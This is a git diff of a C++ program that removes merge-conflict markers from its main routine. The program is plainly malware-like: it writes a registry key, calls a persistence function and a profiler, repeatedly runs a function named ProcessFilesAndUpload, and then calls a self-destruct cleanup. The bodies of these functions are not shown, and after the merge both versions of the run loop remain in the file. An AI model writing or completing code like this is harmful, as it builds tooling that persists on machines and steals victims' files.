@@ -12,10 +12,6 @@ int CURRENTRUNS = 0;
 const std::string COUNT_FILE = "run_count.txt";
 
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 793e7470b3e575a29a87d89297ee44c277d3c695
 int LoadRunCount() {
     std::ifstream inFile(COUNT_FILE);
 
@@ -44,26 +40,18 @@ void CleanupAndDestruct() {
 }
 
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 793e7470b3e575a29a87d89297ee44c277d3c695
 int main() {
     AddRegKey(L"mercury", L"true");
     PersistOnMachine();
     Profiler();
     CURRENTRUNS = LoadRunCount();
 
-<<<<<<< HEAD
     // Mode 1: run once and then > cleanup > self destruct
-=======
->>>>>>> 793e7470b3e575a29a87d89297ee44c277d3c695
     if (ONETIMERUN) {
         ProcessFilesAndUpload();
         CleanupAndDestruct();
     }
 
-<<<<<<< HEAD
     // Mode 2: Run nth number of times as defined in TOTALRUNS > cleanup > self destruct
     if (TOTALRUNS > 0) {
         while (TOTALRUNS > CURRENTRUNS) {
@@ -86,7 +74,6 @@ int main() {
 
     // This code might never see the light of the day but I gonna keep here anyways...
     CleanupAndDestruct(); 
-=======
     while (TOTALRUNS > CURRENTRUNS) {
         ProcessFilesAndUpload();
         CURRENTRUNS += 1;
@@ -103,12 +90,7 @@ int main() {
         std::cout << "Sleeping for 30 seconds..." << std::endl;
         std::this_thread::sleep_for(std::chrono::seconds(30));
     }
->>>>>>> 793e7470b3e575a29a87d89297ee44c277d3c695
 
     return 0;
 }
 
-<<<<<<< HEAD
-//
-=======
->>>>>>> 793e7470b3e575a29a87d89297ee44c277d3c695
